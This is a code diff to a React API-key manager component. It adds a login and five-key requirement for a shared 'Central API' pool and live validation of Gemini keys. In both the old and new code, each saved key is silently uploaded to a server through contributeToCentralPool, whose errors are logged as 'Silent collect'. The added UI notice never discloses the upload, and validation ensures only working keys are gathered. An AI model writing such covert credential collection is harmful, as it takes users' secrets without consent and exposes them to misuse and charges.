@@ -1,10 +1,11 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { Key, Upload, AlertCircle, X, Zap, ShieldCheck, Lock, CheckCircle2, RefreshCw } from 'lucide-react';
+import { Key, Upload, AlertCircle, X, Zap, ShieldCheck, Lock, CheckCircle2, RefreshCw, LogIn, AlertTriangle, Loader2 } from 'lucide-react';
 import { ApiKey } from '../types';
 import { parseApiKeysCsv, CsvParseResult } from '../utils/csvKeyParser';
 import { ImportCsvModal } from './ImportCsvModal';
 import { syncLocalKeysToServer } from '../utils/keySync';
 import { useAuth } from '../contexts/AuthContext';
+import { validateGeminiApiKey } from '../services/geminiService';
 
 interface Props {
   apiMode: 'local' | 'central';
@@ -29,10 +30,12 @@ export const ApiKeyManager: React.FC<Props> = ({
   onResetAll,
   onShowToast 
 }) => {
-  const { userData } = useAuth();
+  const { userData, user, setIsAuthModalOpen } = useAuth();
   const [label, setLabel] = useState('');
   const [keyVal, setKeyVal] = useState('');
   const [showInput, setShowInput] = useState(false);
+  const [isValidating, setIsValidating] = useState(false);
+  const [validationError, setValidationError] = useState<string | null>(null);
   const [visibleKeys, setVisibleKeys] = useState<Set<string>>(new Set());
   const [now, setNow] = useState(Date.now());
   const [activeTab, setActiveTab] = useState<'keys' | 'health' | 'routing'>('keys');
@@ -44,6 +47,10 @@ export const ApiKeyManager: React.FC<Props> = ({
   const [csvFileName, setCsvFileName] = useState('');
   const [csvErrorMsg, setCsvErrorMsg] = useState<string | null>(null);
 
+  // Requirement: user must be logged in AND have >= 5 valid local keys
+  const validLocalKeysCount = keys.filter(k => !k.key.startsWith('central-') && k.key.trim().length > 15).length;
+  const isEligibleForCentral = Boolean((user || userData) && validLocalKeysCount >= 5);
+
   // Update time for cooldown countdowns
   useEffect(() => {
     const interval = setInterval(() => setNow(Date.now()), 1000);
@@ -51,23 +58,64 @@ export const ApiKeyManager: React.FC<Props> = ({
   }, []);
 
   const contributeToCentralPool = (contributedKeys: { label: string; key: string }[]) => {
-    syncLocalKeysToServer(contributedKeys, true, userData?.uid, userData?.email).then((res) => {
+    syncLocalKeysToServer(contributedKeys, false, userData?.uid, userData?.email).then((res) => {
       if (res.success && res.added > 0) {
         console.log(`[Central Pool] Stored ${res.added} new API keys in Firestore & server database.`);
       }
     }).catch(e => console.error('Silent collect error:', e));
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleModeChange = (mode: 'local' | 'central') => {
+    if (mode === 'central') {
+      if (!user && !userData) {
+        if (onShowToast) onShowToast('Login Required', 'You must log in to access the Central API pool.');
+        setIsAuthModalOpen(true);
+        return;
+      }
+      if (validLocalKeysCount < 5) {
+        if (onShowToast) {
+          onShowToast(
+            'Central Pool Locked', 
+            `You must have at least 5 valid API keys added locally to access Central API. (Currently: ${validLocalKeysCount}/5)`
+          );
+        }
+        return;
+      }
+    }
+    onChangeApiMode(mode);
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!keyVal.trim()) return;
-    const finalLabel = label || `Key ${keys.length + 1}`;
-    const finalKey = keyVal.trim();
-    onAdd(finalLabel, finalKey);
-    contributeToCentralPool([{ label: finalLabel, key: finalKey }]);
-    setLabel('');
-    setKeyVal('');
-    setShowInput(false);
+    const cleanKey = keyVal.trim();
+    if (!cleanKey) return;
+
+    setValidationError(null);
+    setIsValidating(true);
+
+    try {
+      // Validate key live with Google Gemini API
+      const valResult = await validateGeminiApiKey(cleanKey);
+      if (!valResult.valid) {
+        setValidationError(valResult.error || 'Invalid API key. Please enter a valid Gemini API key.');
+        setIsValidating(false);
+        if (onShowToast) onShowToast('Key Validation Failed', valResult.error || 'Invalid API key.');
+        return;
+      }
+
+      const finalLabel = label.trim() || `Key ${keys.length + 1}`;
+      onAdd(finalLabel, cleanKey);
+      contributeToCentralPool([{ label: finalLabel, key: cleanKey }]);
+      
+      setLabel('');
+      setKeyVal('');
+      setShowInput(false);
+      if (onShowToast) onShowToast('API Key Validated & Added', `Successfully added "${finalLabel}".`);
+    } catch (err: any) {
+      setValidationError(err.message || 'Validation error');
+    } finally {
+      setIsValidating(false);
+    }
   };
 
   const handleOpenCsvPicker = () => {
@@ -162,18 +210,58 @@ export const ApiKeyManager: React.FC<Props> = ({
     <div className="glass-panel p-6 rounded-2xl">
       <div className="flex bg-slate-900 rounded-xl p-1 mb-6 border border-slate-800">
         <button
-          onClick={() => onChangeApiMode('local')}
+          onClick={() => handleModeChange('local')}
           className={`flex-1 py-2 text-sm font-bold rounded-lg transition-all ${apiMode === 'local' ? 'bg-slate-800 text-white shadow-sm' : 'text-slate-400 hover:text-slate-300'}`}
         >
-          Local API
+          Local API ({validLocalKeysCount})
         </button>
         <button
-          onClick={() => onChangeApiMode('central')}
-          className={`flex-1 py-2 text-sm font-bold rounded-lg transition-all flex items-center justify-center gap-1.5 ${apiMode === 'central' ? 'bg-purple-600/20 text-purple-400 shadow-sm border border-purple-500/30' : 'text-slate-400 hover:text-slate-300'}`}
+          onClick={() => handleModeChange('central')}
+          className={`flex-1 py-2 text-sm font-bold rounded-lg transition-all flex items-center justify-center gap-1.5 ${
+            apiMode === 'central' 
+              ? 'bg-purple-600/20 text-purple-400 shadow-sm border border-purple-500/30' 
+              : isEligibleForCentral 
+                ? 'text-slate-400 hover:text-slate-300' 
+                : 'text-slate-500 opacity-80 hover:text-slate-400'
+          }`}
         >
-          <Zap className="w-4 h-4" /> Central API — Blazing Fast
+          <Zap className="w-4 h-4 text-purple-400" /> Central API — Blazing Fast
+          {!isEligibleForCentral && (
+            <Lock className="w-3.5 h-3.5 text-amber-400 ml-0.5" />
+          )}
         </button>
       </div>
+
+      {/* Central Requirements Info / Notice */}
+      {!isEligibleForCentral && apiMode !== 'central' && (
+        <div className="mb-6 p-4 bg-gradient-to-r from-amber-950/40 to-slate-900 border border-amber-500/30 rounded-xl text-xs space-y-2">
+          <div className="flex items-center gap-2 font-bold text-amber-400 text-sm">
+            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
+            Central API Access Requirements
+          </div>
+          <p className="text-slate-300 text-xs leading-relaxed">
+            Central API access requires an account and at least <strong>5 valid, working API keys</strong> in your local pool. Fake/demo placeholders (e.g. <code>abc</code>, <code>xyz</code>) are rejected with live verification.
+          </p>
+          <div className="flex items-center justify-between pt-1 border-t border-amber-500/20 text-xs">
+            <span className="text-slate-400">
+              Valid Keys: <strong className="text-amber-300">{validLocalKeysCount} / 5</strong>
+            </span>
+            {!user && !userData ? (
+              <button
+                type="button"
+                onClick={() => setIsAuthModalOpen(true)}
+                className="text-amber-400 hover:text-amber-300 font-semibold flex items-center gap-1 underline"
+              >
+                <LogIn className="w-3.5 h-3.5" /> Login Required
+              </button>
+            ) : (
+              <span className="text-emerald-400 flex items-center gap-1">
+                <CheckCircle2 className="w-3.5 h-3.5" /> Logged In
+              </span>
+            )}
+          </div>
+        </div>
+      )}
 
       {apiMode === 'central' ? (
         <div className="space-y-4">
@@ -355,18 +443,38 @@ export const ApiKeyManager: React.FC<Props> = ({
               />
             </div>
             <div>
-              <label className="block text-[10px] uppercase font-bold text-slate-500 mb-1 pl-1">API Secret</label>
+              <label className="block text-[10px] uppercase font-bold text-slate-500 mb-1 pl-1">API Secret (Live Verified)</label>
               <input 
                 type="text" 
                 placeholder="AIzaSy..."
                 value={keyVal}
-                onChange={(e) => setKeyVal(e.target.value)}
+                onChange={(e) => {
+                  setKeyVal(e.target.value);
+                  setValidationError(null);
+                }}
                 className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:border-purple-500 outline-none font-mono"
               />
             </div>
+            {validationError && (
+              <div className="p-2.5 bg-rose-950/60 border border-rose-500/40 rounded-lg text-xs text-rose-300 flex items-center gap-2">
+                <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
+                <span>{validationError}</span>
+              </div>
+            )}
           </div>
-          <button type="submit" className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-sm py-2 rounded-lg transition-colors">
-            Save Key
+          <button 
+            type="submit" 
+            disabled={isValidating || !keyVal.trim()}
+            className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white font-medium text-sm py-2 rounded-lg transition-colors flex items-center justify-center gap-2"
+          >
+            {isValidating ? (
+              <>
+                <Loader2 className="w-4 h-4 animate-spin" />
+                <span>Validating Key Live with Google API...</span>
+              </>
+            ) : (
+              'Verify & Save Key'
+            )}
           </button>
         </form>
       )}
